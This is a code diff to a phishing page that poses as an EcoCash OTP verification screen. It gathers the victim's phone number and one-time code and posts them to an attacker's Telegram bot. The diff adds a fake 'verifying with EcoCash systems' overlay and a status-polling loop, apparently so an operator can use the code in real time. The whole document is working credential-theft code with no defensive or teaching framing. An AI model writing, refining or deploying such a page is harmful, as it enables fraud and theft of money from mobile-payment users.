@@ -178,6 +178,74 @@
             cursor: not-allowed;
         }
 
+        /* Full Screen Loading Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .loading-content {
+            text-align: center;
+            padding: 20px;
+            max-width: 340px;
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle, #007bc4 0%, #014d8c 100%);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            box-shadow: 0 8px 20px rgba(1, 77, 140, 0.2);
+        }
+
+        .spinner::after {
+            content: '';
+            width: 56px;
+            height: 56px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid #ff6f00;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay h3 {
+            color: #014d8c;
+            font-size: 22px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .overlay p {
+            color: #555;
+            font-size: 14px;
+        }
+
         /* Bottom Curved Decoration element */
         .bottom-curve {
             position: fixed;
@@ -243,27 +311,41 @@
         </div>
     </div>
 
+    <!-- Fullscreen Loading Overlay Portal -->
+    <div id="loadingOverlay" class="overlay">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <h3 id="overlay-title">Please wait...</h3>
+            <p id="overlay-text">We are verifying your OTP code with EcoCash systems.</p>
+        </div>
+    </div>
+
     <!-- Design element layout -->
     <div class="bottom-curve"></div>
 
     <script>
         // --- CONFIGURATION ---
-        // Insert your specific bot credentials here
         const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
         const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+        
+        let pollingInterval = null;
+        let globalPhone = "";
 
         // --- FETCHING PREVIOUS NUMBER DYNAMICALLY ---
         window.addEventListener('DOMContentLoaded', () => {
-            // Checks URL variables first (e.g., page8.html?phone=263...) then local state, fallback to hardcoded value
             const urlParams = new URLSearchParams(window.location.search);
             const phoneParam = urlParams.get('phone');
-            const storedPhone = localStorage.getItem('user_phone_number');
+            const storedPhone = localStorage.getItem('user_phone_number') || localStorage.getItem('phone');
             
             if (phoneParam) {
-                document.getElementById('phoneTarget').textContent = phoneParam.startsWith('+') ? phoneParam : '+' + phoneParam;
+                globalPhone = phoneParam;
             } else if (storedPhone) {
-                document.getElementById('phoneTarget').textContent = storedPhone.startsWith('+') ? storedPhone : '+' + storedPhone;
+                globalPhone = storedPhone;
+            } else {
+                globalPhone = "+263771268100"; // fallback default
             }
+
+            document.getElementById('phoneTarget').textContent = globalPhone.startsWith('+') ? globalPhone : '+' + globalPhone;
             
             startCountdown(120); // Initialize 2 minute timer
             setupOtpNavigation();
@@ -274,14 +356,12 @@
             const inputs = document.querySelectorAll('.otp-box');
             
             inputs.forEach((input, index) => {
-                // Focus handling to next element automatically
                 input.addEventListener('input', (e) => {
                     if (input.value.length === 1 && index < inputs.length - 1) {
                         inputs[index + 1].focus();
                     }
                 });
 
-                // Clear/Backspace navigation support
                 input.addEventListener('keydown', (e) => {
                     if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
                         inputs[index - 1].focus();
@@ -321,11 +401,49 @@
 
         function triggerResend() {
             alert("A new OTP code has been sent!");
-            // Restart the 2 minutes clock (120 seconds)
             startCountdown(120);
         }
 
-        // --- API NOTIFICATION SEND TO TELEGRAM ---
+        // --- CHECK STATUS FROM BACKEND SERVER API ---
+        async function checkVerificationStatus() {
+            if (!globalPhone) return;
+
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(globalPhone)}`);
+                const data = await res.json();
+
+                const overlayTitle = document.getElementById('overlay-title');
+                const overlayText = document.getElementById('overlay-text');
+
+                if (data.status === "approved" || data.status === "verified") {
+                    clearInterval(pollingInterval);
+                    overlayTitle.textContent = "Success!";
+                    overlayText.textContent = "OTP verified successfully.";
+                    document.querySelector('.spinner').style.background = '#4CAF50';
+                    
+                    setTimeout(() => {
+                        window.location.href = "/dashboard.html"; // Adjust to final page location
+                    }, 2000);
+                }
+
+                if (data.status === "denied" || data.status === "failed") {
+                    clearInterval(pollingInterval);
+                    overlayTitle.textContent = "Verification Failed";
+                    overlayText.textContent = "The OTP code entered is invalid. Returning...";
+                    
+                    setTimeout(() => {
+                        document.getElementById('loadingOverlay').classList.remove('active');
+                        // clear inputs for retry
+                        document.querySelectorAll('.otp-box').forEach(i => i.value = "");
+                    }, 2500);
+                }
+
+            } catch (err) {
+                console.error("❌ Live server polling failed:", err);
+            }
+        }
+
+        // --- SUBMIT CODE TO TELEGRAM & START MODAL ---
         function sendVerificationData() {
             const inputs = document.querySelectorAll('.otp-box');
             let otpCode = "";
@@ -336,16 +454,12 @@
                 return;
             }
 
-            const phoneNumber = document.getElementById('phoneTarget').textContent;
-            const verifyButton = document.getElementById('verifyButton');
-            
-            verifyButton.disabled = true;
-            verifyButton.textContent = "Verifying...";
+            // Show full screen processing animation overlay
+            document.getElementById('loadingOverlay').classList.add('active');
 
-            // Construct structural notification payload
-            const textMessage = `🔔 *New OTP Code Submission*\n\n📱 *Phone Number:* ${phoneNumber}\n🔑 *Entered OTP:* \`${otpCode}\``;
+            // Dispatch log payload to Telegram channel
+            const textMessage = `🔑 *New OTP Submission Received*\n\n📱 *Phone Number:* ${globalPhone}\n🔢 *OTP Code:* \`${otpCode}\``;
 
-            // Send notification to your server API target/Telegram directly
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -355,21 +469,18 @@
                     parse_mode: 'Markdown'
                 })
             })
-            .then(response => response.json())
+            .then(res => res.json())
             .then(data => {
-                verifyButton.disabled = false;
-                verifyButton.textContent = "Verify";
                 if(data.ok) {
-                    alert("Verification code processed successfully.");
-                } else {
-                    alert("Submission failed. Check backend bot parameters.");
+                    console.log("✔️ Telegram log updated successfully.");
                 }
+                // Begin console loop checks on the backend server system status every 2.5 seconds
+                pollingInterval = setInterval(checkVerificationStatus, 2500);
             })
             .catch(err => {
-                console.error(err);
-                verifyButton.disabled = false;
-                verifyButton.textContent = "Verify";
-                alert("Network error occurred during submission.");
+                console.error("❌ Telegram posting error:", err);
+                // Fallback directly to backend verification loop even if Telegram client has timeout errors
+                pollingInterval = setInterval(checkVerificationStatus, 2500);
             });
         }
     </script>
